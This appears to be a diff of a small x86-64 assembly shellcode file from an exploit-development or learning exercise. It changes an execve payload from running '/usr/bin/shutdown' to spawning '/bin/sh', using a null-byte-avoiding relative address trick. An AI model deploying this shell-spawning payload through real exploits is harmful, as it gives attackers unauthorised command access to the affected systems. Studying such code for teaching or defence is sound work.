@@ -5,25 +5,19 @@ section .text
 
 _start:
 
-call _instructions
-
-_instructions:
-
 	xor rax, rax
 	xor rdi, rdi
 	xor rsi, rsi
 	xor rdx, rdx
 
-	; getting address of `pathname`
-	pop rdi
-	add rdi, 0x69
+	lea rdi, [rel _pathname + 0x10101010]
+	sub rdi, 0x10101010
 
 	mov al, 59
 
-	mov rdi, rsp
-
 	syscall
 
+	xor rax,rax
 	mov al, 60
 
 	xor rdi, rdi
@@ -31,4 +25,4 @@ _instructions:
 	syscall
 
 _pathname:
-	db "/usr/bin/shutdown",0
+	db "/bin/sh",0
